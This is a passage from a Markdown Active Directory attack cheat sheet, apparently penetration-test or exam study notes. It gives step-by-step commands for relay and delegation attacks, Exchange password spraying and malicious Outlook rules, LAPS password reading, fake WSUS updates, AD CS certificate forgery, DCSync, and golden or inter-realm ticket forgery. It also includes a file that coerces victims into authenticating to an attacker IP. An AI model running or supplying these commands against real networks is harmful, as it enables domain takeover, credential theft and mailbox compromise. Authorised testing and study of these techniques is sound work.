.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:host/<TARGET COMPUTER> /altservice:ldap,rpc,http,cifs,host /ptt
```

#### Access the C Disk if user is local admin to the target machine (When impersonating DA)
```
dir \\<COMPUTER>\C$
```

- If dir doesn't work check blogpost

#### It is possible that you impersonated another user which leads to more ACL abuses!

### Webclient Attack
- Requirements:
  - On a Domain Controller to have the LDAP signing or LDAPS binding not enforced (default value)
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
- https://www.bussink.net/rbcd-webclient-attack/
- The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)". You can relay to LDAP and use your own object with a SPN or relay to LDAPS and it will create it. If LDAP or use a specific user use the ```--escalate-user``` flag.

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

crackmapexec ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Check LDAP Signing and LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>

cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-signing
```

#### Scan for target with webclient active
- https://github.com/Hackndo/WebclientServiceScanner
```
webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>

crackmapexec smb <HOST> -d <DOMAIN> -u <USER> -p <PASSWORD> -M webdav
```

#### If no targets, place file on share to activate webclients
- https://www.bussink.net/webclient_activation/
- Filename ```Documents.searchConnector-ms```
```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>//<ATTACKER IP>/test.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>//<ATTACKER IP>/test</url>
    </simpleLocation>
</searchConnectorDescription>
```

#### Create a DNS record pointing to the attacker's machine IP
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
```
dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>

$creds = get-credential
Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
```
import-module Powermad.ps1 
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Start NTLMRelay
```
sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
```

#### Trigger target to authenticate to attacker machine
- Use hostname we created in the DNS record
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>

python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@8080/a
```

#### Select user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Impersonate any user and exploit
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
export KRB5CCNAME=administrator.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```

### Change lockscreen
- Requirements:
  - Low priv shell on a machine
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
- https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
```
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Create a DNS record pointing to the attacker's machine IP
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
```
dnstool.py -u <DOMAIN>\<USER> -a add -r webdav.<DOMAIN> -d <ATTACKER IP> <DC IP>

$creds = get-credential
Invoke-DNSUpdate -DNSType A -DNSName webdav.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
```
- Didn't test dnstool for this attack

#### Serve image with impacket
```
sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
```

#### Change lockscreen image
- https://github.com/nccgroup/Change-Lockscreen
```
change-lockscreen -webdav \\webdav@80\
```

#### Impersonate any user
```
getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
Export KRB5CCNAME=administrator.ccache
Psexec.py -k -no-pass <TARGET FQDN>
```

## Relaying attacks
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/

[Relaying section](relaying.md)

## MS Exchange
- Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
- Outlook Forms VBSCript engine is different then the VBA Macro script engine (So disabling macro's wont defend against it)

### Attacking externally
- Attah path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing

#### Collection of data (OSINT)
- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
  - https://github.com/mschwager/fierce
  - https://www.elevenpaths.com/innovation-labs/technologies/foca
  - https://github.com/lanmaster53/recon-ng
  - https://github.com/leebaird/discover
  - https://github.com/laramies/theHarvester

#### Domain name discovery
- https://github.com/dafthack/MailSniper
```
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME>
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
```
- Internal Domain name may be found inside a SSL Certificate

#### Name scheme fuzzing
- Create a username list from the OSINT
- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
```
Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii possible-usernames.txt
```

- https://gist.github.com/superkojiman/11076951
```
/opt/namemash.py names.txt >> possible-usernames.txt
```

#### Username Enumeration
- https://github.com/dafthack/MailSniper
```
Invoke-UsernameHarvestOWA -Userlist possible-usernames.txt -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile domain_users.txt
```

#### Password discovery
- https://github.com/dafthack/MailSniper
```
Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile ews-sprayed-creds.txt
```

#### Global Address List (GAL) Extraction
- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```
- Then you could spray passwords again to get access to more mail accounts!

#### Bypassing 2fa
- Can check by server responses if supplied password is correct or not.
- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!

```
# Access through EWS
Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
```

#### Spreading the compromise
- Pillaging mailboxes for credentials/sensitive data
  -  https://github.com/milo2012/owaDump (--keyword option)
  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
- Internal phishing
  - Mail from internal email adresses to targets.
- Malicious Outlook rules
  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
  - Since Outlook 2016 both options are disabled by default
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange Service Access (via RPC or MAPI over HTTP)
    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
  - The attack:
    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
    - Send the trigger email. 
- Malicious Outlook Forms
  - If the path is applied that disables Run Application and Run Script rules this still works!
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange service access 
  - KB4011091 for outlook 2016 seems to block VBSCript in forms
  - https://github.com/sensepost/ruler/wiki/Forms
  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```

### Attacking from the inside
- All the attacks from the outside works from the inside!
- https://github.com/dafthack/MailSniper

#### Enumerate all mailboxes
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```

#### Check access to mailboxes with current user
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

#### Exchange ActiveSync
- This attack applies when the DC and Exchange Server are hosted on the same machine
- https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync/

### MS Exchange escalating privileges
- Attack is performed cross domain, but can be done inside the domain. Just use the current domain instead of parent domain!
![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)

#### Enumerate if exchange groups exist
```
. ./Powerview.ps1
Get-DomainGroup *exchange* -Domain <DOMAIN>
```

#### Enumerate membership of the groups
```
Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
Get-DomainGroupMember "Exchange Windows Permissions" -Domain <DOMAIN>
```

#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

#### Add permissions to execute DCSYNC
- When member of the ```Exchange Windows Permissions``` group
```
Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
```

#### Execute DCSYNC
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
```

#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

### NTLM Relay MS Exchange abuse
- https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

#### The attack using domain credentials
- https://github.com/dirkjanm/privexchange/
- Attack takes a minute!
```
sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>

python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>

secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
```

#### The attack without credentials
- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py first
- Really vague described in the INE slides. Never tried it either!
```
sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
```

#### Restore ACL's with aclpwn.py
- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's

```
python3 aclpwn.py --restore aclpwn.restore
```

## LAPS
- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit

#### Check if LAPS is installed on local computer
```
Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions #DOESNT WORK? GOTTA CHECK ECPPTX MATERIAL AGAIN
```

### Check existence of LAPS in the domain
#### Check for existence of the ms-mcs-admpwd attribute
```
Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
```

#### Check for computers with LAPS installed
```
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
```

#### Check for GPO's with LAPS in its name
```
Get-DomainGPO -Identity *LAPS*
```

#### Check for OU's with LAPS
```
Get-DomainOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }
```

#### Check which computers is part of the OU
```
Get-DomainOU -OUName <NAME> | %{Get-DomainComputer -ADSpath $_}
```

#### Check to which computers the LAPS GPO is applied to
```
Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
```

#### Check all computers without LAPS
```
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
```

#### Check the LAPS configuration
- https://github.com/PowerShell/GPRegistryPolicy
- Password complexity, password length, password expiration, Acccount managing LAPS
- AdmPwdEnabled 1 = local administrator password is managed
- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
```
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### Find all users who can read passwords in clear text machines in OU's
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
```

```
Import-Module AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

#### If retured groups, get the users:
```
$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
```

#### Read clear-text passwords:
```
Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd

#LAPS Powershell cmdlet
Get-AdmPwdPassword -ComputerName <MACHINE NAME>
```

## Attacking WSUS
- When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
- Requirements
  - WSUS without SSL encryption
  - Only deliver binaries signed by MS, such as psexec
  - Must perform arp spoofing or tamper with the system's proxy settings 
- https://github.com/ctxis/wsuspect-proxy
- https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf

#### Identify usage of WSUS
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
```

#### Retrieve WSUS URL
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

### Injecting a fake update via straight ARP spoofing
- https://github.com/pimps/wsuxploit
- If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
  - https://github.com/evilsocket/bettercap 

### Inject fake update
```
.\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
```

### Injecten a fake update via WPAD injection
#### Check if automatic detection of the proxy is performed
- If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
```
req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
```

### Attacking WSUS Server
- WSUS server is most likely be interconnected to servers containing sensitive information.
- After comprimising the WSUS server it might be possible to acces networks you weren't able before.
- Inject a fake update directory to the WSUS server
  - https://github.com/AlsidOfficial/WSUSpendu 

## S4U2self
- Gain access to a domain computer if we have its RC4, AES256 or TGT.
- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse

#### Dump TGT
```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
```

#### Request TGS
```
.\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
```

- S4u2proxy will fail, the s4uself works. Copy the s4u2self base64 string

#### Save it to disk
```
[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
```

#### Get information of the ticket
```
.\Rubeus.exe describe /ticket:C:\Users\public\<USER>.kirbi
```

- The Servicename is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".
- Open it in ```Asn1Editor```.  Find the two instances where the GENERAL STRING <COMOTERNAME>$" appears.
- Double-click them to open the Node Content Editor and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent SEQUENCE and select New.  Enter 1b in the Tag field and click OK.  Double-click on the new node to edit the text.
- First one should be CIFS, second one the FQDN of the machine.
 
![afbeelding](https://user-images.githubusercontent.com/43987245/159697361-dab68723-e4d7-4966-9e6c-fad2f658457b.png)

#### Load the ticket
```
.\Rubeus.exe /ticket:<TICKET BASE64>
.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
```
 
#### Execute ls on the computer
```
ls \\<COMPOTERNAME FQDN>\C$
```
 
## Active Directory Certificate Services
- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
- https://github.com/GhostPack/Certify

#### Find AD CS Certificate authorities (CA's)
```
.\Certify.exe cas
```

### Misconfigured Certificate Templates
- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

#### Find misconfigured certificate templates
- Look for ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is enabled.
- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
```
.\Certify.exe find /vulnerable
```

#### Request certificate for a user
- For example domain admin
```
.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
```
- Save cert + key in a cert.pem file

#### Transform cert to pfx
- Set a password, password
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Rubeus ask TGT using the certificate
```
cat cert.pfx | base64 -w 0
.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
```

#### Write TGT kirbi
```
[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
```
 
#### Then load TGT and request TGS or access systems as this user.

### Relaying to ADCS HTTP Endpoints
- AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.

#### Start ntlmrelayx.py
```
ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```
 
#### Force authentication
```
.\SpoolSample.exe <IP> <IP>
```
 
#### Ouput should give a TGT which can be used with S4U2self
- LINK TO S4U2self
 
### Forged Certificates
#### Dump the private keys
- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
- https://github.com/GhostPack/SharpDPAPI
```
.\SharpDPAPI.exe certificates /machine
```
- Save cert + key in a cert.pem file

#### Transform cert to pfx
- Set a password, password
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Create a forged certificate
```
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
```

#### Create a TGT
```
cat cert.pfx | base64 -w 0
.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
```

#### Write TGT kirbi
```
[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
```
 
#### Then load TGT and request TGS or access systems as this user.
 
## Cross Domain attacks
## Azure AD
#### Enumerate where PHS AD connect is installed
```
Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
```

#### On the AD connect server extract MSOL_ Credentials
```
.\adconnect.ps1
```

#### Run cmd as MSOL_
```
runas /user:<DOMAIN>\<USER> /netonly cmd
```

#### Execute DCSync
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

## Child to Forest Root
### Trust key
- Abuses SID History
#### Dump trust keys
- Look for in trust key from child to parent (first command)
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create an inter-realm TGT
- Uses well know Enterprise Admins SIDS
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
```

#### Create a TGS using Rubeus and inject current Powershell session
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
```

#### Create a TGS for a service (kekeo_old and new)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> <SERVICE>/<FQDN PARENT DC>
tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
```

#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
```
./kirbikator.exe lsa .\<KIRBI FILE>
misc::convert lsa <KIRBI FILE>
```

#### Check access to server
```
dir \\<FQDN PARENT DC>\C$ 
Enter-PSSession <COMPUTERNAME>
.\PsExec64.exe \\<COMPUTERNAME> cmd
```

### Krbtgt hash
- Abuses SID History
#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername <DC>
```

#### Create TGT and inject in current session
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
- Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
- Remove ```/ptt``` to save ticket to file
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
```
 
- *Opsec way*
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
```

#### Check access to server
```
dir \\<FQDN PARENT DC>\C$ 
Enter-PSSession <COMPUTERNAME>
.\PsExec64.exe \\<COMPUTERNAME> cmd
```

## Crossforest attacks
### Kerberoast2
#### Enumerate users with SPN cross-forest
```
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
```

#### Request and crack TGS see:
See [Kerberoast](#Kerberoast) 

### Printer bug2
-  It also works across a Two-way forest trust if TGT Delegation is enabled!

#### Check if TGTDelegation is enabled (run on DC)
```
netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
```

See [Printer Bug](#Printer-bug) for exploitation

### Trust key2
-  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
-  There is no way to enumerate which resources are shared.

#### Dump trust keys
- Look for in trust key from child to parent (first command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SIDS> /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Create a TGS for a service (kekeo_old)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> CIFS/<TARGET SERVER>
```

#### Inject the TGS
```
./kirbikator.exe lsa <KIRBI FILE>
```

